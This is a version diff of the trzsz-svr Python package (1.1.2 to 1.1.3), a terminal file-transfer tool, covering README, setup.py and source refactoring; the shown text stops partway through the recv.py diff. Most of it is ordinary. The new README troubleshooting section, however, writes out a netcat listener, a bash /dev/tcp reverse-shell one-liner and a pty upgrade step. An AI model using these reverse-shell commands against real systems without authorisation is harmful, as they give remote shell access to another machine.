# Comparing `tmp/trzsz-svr-1.1.2.tar.gz` & `tmp/trzsz-svr-1.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "trzsz-svr-1.1.2.tar", last modified: Sun Mar 26 07:39:08 2023, max compression
+gzip compressed data, was "trzsz-svr-1.1.3.tar", last modified: Sat Jul  8 14:07:04 2023, max compression
```

## Comparing `trzsz-svr-1.1.2.tar` & `trzsz-svr-1.1.3.tar`

### file list

```diff
@@ -1,21 +1,32 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.964863 trzsz-svr-1.1.2/
--rw-r--r--   0 runner    (1001) docker     (123)     7760 2023-03-26 07:39:08.964863 trzsz-svr-1.1.2/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     6667 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/README.md
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-03-26 07:39:08.964863 trzsz-svr-1.1.2/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3307 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.960863 trzsz-svr-1.1.2/trzsz/
--rw-r--r--   0 runner    (1001) docker     (123)     1260 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/trzsz/__init__.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.960863 trzsz-svr-1.1.2/trzsz/svr/
--rw-r--r--   0 runner    (1001) docker     (123)     1105 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/trzsz/svr/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)     1128 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/trzsz/svr/__version__.py
--rw-r--r--   0 runner    (1001) docker     (123)     5555 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/trzsz/svr/recv.py
--rw-r--r--   0 runner    (1001) docker     (123)     4975 2023-03-26 07:39:03.000000 trzsz-svr-1.1.2/trzsz/svr/send.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.964863 trzsz-svr-1.1.2/trzsz_svr.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     7760 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      393 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       70 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/namespace_packages.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/not-zip-safe
--rw-r--r--   0 runner    (1001) docker     (123)       18 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-03-26 07:39:08.000000 trzsz-svr-1.1.2/trzsz_svr.egg-info/top_level.txt
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/
+-rw-r--r--   0 runner    (1001) docker     (123)     9843 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     8750 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     2912 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.354315 trzsz-svr-1.1.3/svr-tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     1124 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6062 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/test_recv.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6481 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/test_send.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.354315 trzsz-svr-1.1.3/svr-tests/trzsz/
+-rw-r--r--   0 runner    (1001) docker     (123)     1279 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/trzsz/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/svr-tests/trzsz/svr/
+-rw-r--r--   0 runner    (1001) docker     (123)     1124 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/trzsz/svr/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1147 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/trzsz/svr/__version__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6050 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/trzsz/svr/recv.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5468 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/svr-tests/trzsz/svr/send.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/trzsz/
+-rw-r--r--   0 runner    (1001) docker     (123)     1279 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/trzsz/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/trzsz/svr/
+-rw-r--r--   0 runner    (1001) docker     (123)     1124 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/trzsz/svr/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1147 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/trzsz/svr/__version__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6050 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/trzsz/svr/recv.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5468 2023-07-08 14:07:00.000000 trzsz-svr-1.1.3/trzsz/svr/send.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:04.358315 trzsz-svr-1.1.3/trzsz_svr.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     9843 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      612 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       70 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/namespace_packages.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       18 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       16 2023-07-08 14:07:04.000000 trzsz-svr-1.1.3/trzsz_svr.egg-info/top_level.txt
```

### Comparing `trzsz-svr-1.1.2/PKG-INFO` & `trzsz-svr-1.1.3/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: trzsz-svr
-Version: 1.1.2
+Version: 1.1.3
 Summary: trzsz is a simple file transfer tools, similar to lrzsz ( rz / sz ) and compatible with tmux, which works with iTerm2 and has a nice progress bar.
 Home-page: https://trzsz.github.io
 Author: Lonny Wong
 Author-email: lonnywong@qq.com
 License: MIT License
 Keywords: trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar
 Classifier: Development Status :: 5 - Production/Stable
@@ -30,170 +30,201 @@
 
 Website: [https://trzsz.github.io](https://trzsz.github.io)
 
 [![MIT License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)](https://choosealicense.com/licenses/mit/)
 [![PyPI trzsz](https://img.shields.io/pypi/v/trzsz?style=flat)](https://pypi.python.org/pypi/trzsz/)
 [![中文网站](https://img.shields.io/badge/%E4%B8%AD%E6%96%87-%E7%BD%91%E7%AB%99-blue?style=flat)](https://trzsz.github.io/cn/)
 
-
 ## Why?
 
 Considering `laptop -> hostA -> hostB -> docker -> tmux`, using `scp` or `sftp` is inconvenience.
 
 In this case, `lrzsz` ( rz / sz ) is convenient to use, but unfortunately it's not compatible with `tmux`.
 
 `tmux` is not going to support rz / sz ( [906](https://github.com/tmux/tmux/issues/906), [1439](https://github.com/tmux/tmux/issues/1439) ), and creating a new tools is much easier than patching `tmux`.
 
-
 ## Advantage
 
-* Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
-* Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
-* Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
-* Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
-* Support **web terminal**, transfer files and directories between local and remote servers over the web.
-* Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
-* Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
-* Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
-
+- Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
+- Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
+- Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
+- Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
+- Support **web terminal**, transfer files and directories between local and remote servers over the web.
+- Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
+- Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
+- Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
 
 ## Installation
 
 ### On the server
 
-* with Python3
+- Install [the Go version](https://github.com/trzsz/trzsz-go) ( ⭐ Recommended )
+
+  Please check the Go version installation guide: [https://github.com/trzsz/trzsz-go#installation](https://github.com/trzsz/trzsz-go#installation)
+
+- Or install with Python3
+
   ```
   sudo python3 -m pip install --upgrade trzsz
   ```
 
-* with Python2
+- Or install with Python2
+
   ```
   sudo python2 -m pip install --upgrade trzsz
   ```
 
-* with Homebrew
+- Or install with Homebrew
+
   ```
   brew update
   brew install trzsz
   ```
 
-* with Node.js
+- Or install with Node.js
   ```
   sudo npm install -g trzsz
   ```
 
-* or install trzsz written in Go
-
-  Check [https://github.com/trzsz/trzsz-go](https://github.com/trzsz/trzsz-go)
-
-
 &nbsp;&nbsp;Can be installed without `sudo`, just add the installation path ( e.g. `~/.local/bin` ) to the `PATH` environment.
 
-
 ### Supported Terminals
 
-* [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
+- [trzsz-ssh](https://github.com/trzsz/trzsz-ssh) ( tssh ) -- simple ssh client with trzsz support ( ⭐ Recommended ).
 
-* [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
+- [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
 
-* [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
+- [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
 
-* [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
+- [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
 
-* [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
+- [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
 
-* [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
+- [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
 
-&nbsp;&nbsp;*Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list.*
+- [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
 
+&nbsp;&nbsp;_Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list._
 
 ## Trzsz Manual
 
 #### `trz` upload files to the remote server
-  ```
-  usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  Receive file(s), similar to rz and compatible with tmux.
+```
+usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  positional arguments:
-    path               path to save file(s). (default: current directory)
+Receive file(s), similar to rz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  path               path to save file(s). (default: current directory)
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### `tsz` download files from the remote server
-  ```
-  usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  Send file(s), similar to sz and compatible with tmux.
+```
+usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  positional arguments:
-    file               file(s) to be sent
+Send file(s), similar to sz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  file               file(s) to be sent
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### Trouble shooting
-* If `tmux` is not running on the remote server, but on the local computer, or on a middle server.
-  * Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
-  * Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, and `alias ssh="trzsz ssh"` for convenience.
-
-* If an error occurs, and `trzsz` is hanging up.
-  * Press `control + c` to stop `trz` or `tsz` process on the server.
-  * For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
 
-* If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
-  * Try to escape all known control characters, e.g., `trz -eb`.
+- If `tmux` is running on the local computer.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, use `trzsz ssh` to login after `tmux`.
+
+- If `tmux` is running on the jump server.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the jump server, use `trzsz -r ssh` to login after `tmux`.
+
+- If an error occurs, and `trzsz` is hanging up.
+
+  - Press `control + c` to stop `trz` or `tsz` process on the server.
+  - For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
+
+- If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
+
+  - Try to escape all known control characters, e.g., `trz -eb`.
 
-* If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
-  * Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
+- If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
+
+  - Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
     ```
     #!/bin/sh
     export LC_CTYPE=C
     expect -c '
       spawn ssh xxx
       expect "xxx: "
       send "xxx\n"
       interact
     '
     ```
 
+- If you want to upload and download using `trz / tsz` in a reverse shell, you need to follow these steps:
+
+  - 1\. Use `tssh xxx` or `trzsz ssh xxx` to log in to the server.
+  - 2\. Execute `nc -lnv 1337` on the server, and wait for the reverse shell connection.
+  - 3\. Reverse connect to the server on the target, such as `bash -i >& /dev/tcp/192.168.0.1/1337 0>&1`.
+  - 4\. Follow these steps in the reverse shell:
+    - 4.1. Convert to an interactive shell, such as `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+    - 4.2. Press `ctrl + z` to turn the reverse shell into background.
+    - 4.3. Execute `stty raw -echo; fg` to disable the echo of the server, and return to the reverse shell.
+    - 4.4. Press the Enter key, and the command line prompt will be displayed.
+    - 4.5. Set the terminal environment variable `export TERM=xterm-256color` ( not necessary ).
+    - 4.6. Check if there is a `TMUX` environment variable, clear it with `unset TMUX`.
+    - 4.7. Now you can use `trz / tsz` to upload and download as normal.
+  - 5\. After exiting the interactive shell, there will be no echo, type `exit` blindly to exit the reverse shell.
+  - 6\. Type `reset` blindly on the server and press Enter to reset the default settings of the terminal.
+
 ## Screenshot
 
 #### Using trzsz in iTerm2 with `text` progress bar
 
-  ![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
-
+![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
 
 #### Using trzsz in iTerm2 with `zenity` progress bar
 
-  ![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
-
+![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
 
 #### Using trzsz in tabby with `tabby-trzsz` plugin
 
-  ![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
-
+![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
 
 ## Contact
 
-Feel free to email me <lonnywong@qq.com>.
+Feel free to email the author <lonnywong@qq.com>. Welcome to join the QQ group: 318578930.
+
+Want to buy the author a drink 🍺 ?
+
+![sponsor wechat qrcode](https://trzsz.github.io/images/sponsor_wechat.jpg)
+![sponsor alipay qrcode](https://trzsz.github.io/images/sponsor_alipay.jpg)
```

### Comparing `trzsz-svr-1.1.2/setup.py` & `trzsz-svr-1.1.3/setup.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2022 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -19,20 +19,20 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
 import re
 from setuptools import setup, find_packages
 
-version_regex = r'[ \t]*__version__[ \t]*=[ \t]*[\'"](\d+\.\d+\.\d+)[\'"]'
-with open('trzsz/svr/__version__.py', 'r') as f:
-    version = re.search(version_regex, f.read()).group(1)
+VERSION_REGEX = r'[ \t]*__version__[ \t]*=[ \t]*[\'"](\d+\.\d+\.\d+)[\'"]'
+with open('trzsz/svr/__version__.py', 'r') as file:
+    version = re.search(VERSION_REGEX, file.read()).group(1)
 
-with open('README.md', 'rb') as f:
-    long_description = f.read().decode('utf8')
+with open('README.md', 'rb') as file:
+    long_description = file.read().decode('utf8')
 
 classifiers = [
     'Development Status :: 5 - Production/Stable',
     'Environment :: Console',
     'Intended Audience :: Developers',
     'Intended Audience :: Science/Research',
     'Intended Audience :: System Administrators',
@@ -52,26 +52,26 @@
     'console_scripts': [
         'trz = trzsz.svr.recv:main',
         'tsz = trzsz.svr.send:main',
     ],
 }
 
 setup(
-    name                            = 'trzsz-svr',
-    version                         = version,
-    author                          = 'Lonny Wong',
-    author_email                    = 'lonnywong@qq.com',
-    packages                        = find_packages(),
-    namespace_packages              = ['trzsz'],
-    long_description                = long_description,
-    long_description_content_type   = 'text/markdown',
-    url                             = 'https://trzsz.github.io',
-    install_requires                = [ 'trzsz-libs == ' + version ],
-    license                         = 'MIT License',
-    classifiers                     = classifiers,
-    entry_points                    = entry_points,
-    keywords                        = 'trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar',
-    zip_safe                        = False,
-    description                     = 'trzsz is a simple file transfer tools, ' \
-                                      'similar to lrzsz ( rz / sz ) and compatible with tmux, ' \
-                                      'which works with iTerm2 and has a nice progress bar.',
+    name='trzsz-svr',
+    version=version,
+    author='Lonny Wong',
+    author_email='lonnywong@qq.com',
+    packages=find_packages(),
+    namespace_packages=['trzsz'],
+    long_description=long_description,
+    long_description_content_type='text/markdown',
+    url='https://trzsz.github.io',
+    install_requires=['trzsz-libs == ' + version],
+    license='MIT License',
+    classifiers=classifiers,
+    entry_points=entry_points,
+    keywords='trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar',
+    zip_safe=False,
+    description='trzsz is a simple file transfer tools, '
+    'similar to lrzsz ( rz / sz ) and compatible with tmux, '
+    'which works with iTerm2 and has a nice progress bar.',
 )
```

### Comparing `trzsz-svr-1.1.2/trzsz/__init__.py` & `trzsz-svr-1.1.3/svr-tests/trzsz/__init__.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2021 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
```

### Comparing `trzsz-svr-1.1.2/trzsz/svr/__init__.py` & `trzsz-svr-1.1.3/svr-tests/__init__.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2021 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
```

### Comparing `trzsz-svr-1.1.2/trzsz/svr/__version__.py` & `trzsz-svr-1.1.3/svr-tests/trzsz/svr/__version__.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2023 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -16,8 +16,8 @@
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-__version__ = '1.1.2'
+__version__ = '1.1.3'
```

### Comparing `trzsz-svr-1.1.2/trzsz/svr/recv.py` & `trzsz-svr-1.1.3/svr-tests/trzsz/svr/recv.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2022 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -16,106 +16,120 @@
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
+import os
 import sys
 import time
 import argparse
-from trzsz.libs.utils import *
+from trzsz.libs import utils
+from trzsz.libs import transfer
 from trzsz.svr.__version__ import __version__
 
-def main():
+
+def parse_args(sys_args):
     parser = argparse.ArgumentParser(description='Receive file(s), similar to rz and compatible with tmux.',
                                      formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('-v', '--version', action='version', version='%(prog)s (trzsz) py ' + __version__)
     parser.add_argument('-q', '--quiet', action='store_true', help='quiet (hide progress bar)')
     parser.add_argument('-y', '--overwrite', action='store_true', help='yes, overwrite existing file(s)')
     parser.add_argument('-b', '--binary', action='store_true', help='binary transfer mode, faster for binary files')
     parser.add_argument('-e', '--escape', action='store_true', help='escape all known control characters')
     parser.add_argument('-d', '--directory', action='store_true', help='transfer directories and files')
+    parser.add_argument('-r', '--recursive', action='store_true', help='transfer directories and files, same as -d')
     parser.add_argument('-B',
                         '--bufsize',
                         min_size='1K',
                         max_size='1G',
                         default='10M',
-                        action=BufferSizeParser,
+                        action=utils.BufferSizeParser,
                         metavar='N',
                         help='max buffer chunk size (1K<=N<=1G). (default: 10M)')
     parser.add_argument('-t',
                         '--timeout',
                         type=int,
                         default=20,
                         metavar='N',
                         help='timeout ( N seconds ) for each buffer chunk.\nN <= 0 means never timeout. (default: 20)')
     parser.add_argument('path', nargs='?', default='.', help='path to save file(s). (default: current directory)')
-    args = parser.parse_args()
-    dest_path = convert_to_unicode(os.path.abspath(args.path))
+    args = parser.parse_args(sys_args)
+    if args.recursive is True:
+        args.directory = True
+    return args
+
+
+def recv_files(args, dest_path):
+    action = transfer.recv_action()
+
+    if not action.get('confirm', False):
+        transfer.server_exit('Cancelled')
+        return
+
+    # check if the client doesn't support binary mode
+    if args.binary and action.get('binary') is False:
+        args.binary = False
+    # check if the client doesn't support transfer directory
+    if args.directory and action.get('support_dir') is not True:
+        raise utils.TrzszError("The client doesn't support transfer directory", trace=False)
+
+    transfer.send_config(args, action, utils.get_escape_chars(args.escape))
+
+    local_list = transfer.recv_files(dest_path, None)
+
+    _ = transfer.recv_exit()
+    transfer.server_exit(utils.format_saved_files(local_list, dest_path))
+
+
+def main():
